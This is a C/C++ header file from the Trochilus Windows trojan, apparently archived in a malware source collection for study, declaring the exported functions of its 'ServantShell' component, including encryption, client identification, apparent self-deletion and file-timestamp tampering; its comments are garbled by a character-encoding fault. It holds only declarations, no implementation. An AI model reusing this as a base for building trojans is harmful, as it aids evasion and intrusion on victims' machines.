/*
  name      Trochilus
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
#pragma once
#include "../../../common/CommNames.h"

#ifdef SERVANTSHELL_EXPORTS
#	define SHELL_API extern "C" 
#else
#	define SHELL_API extern "C" __declspec(dllimport)
#endif

//��ȡ��ǰ·��������ֵ��\��β
SHELL_API LPCTSTR GetLocalPath();

//���ӽ���
SHELL_API BOOL XFC(const LPVOID lpPlain, DWORD dwPlainLen, LPVOID lpEncrypted, UINT factor0, UINT factor1);

//��ȡ�ͻ���ID
SHELL_API BOOL GetClientID(GUID* pGuid);

//�˳�����
SHELL_API void Exit();

//�ͻ����Ի�
SHELL_API void SD();

//����ServantShell��ʱ����� �ļ�ʱ��
SHELL_API BOOL AdjustTimes(LPCTSTR filepath);

//��������Ŀ¼��ʱ��
SHELL_API void CheckDT();

//��ʼ����ľ��
SHELL_API void Init(BOOL isIns = TRUE);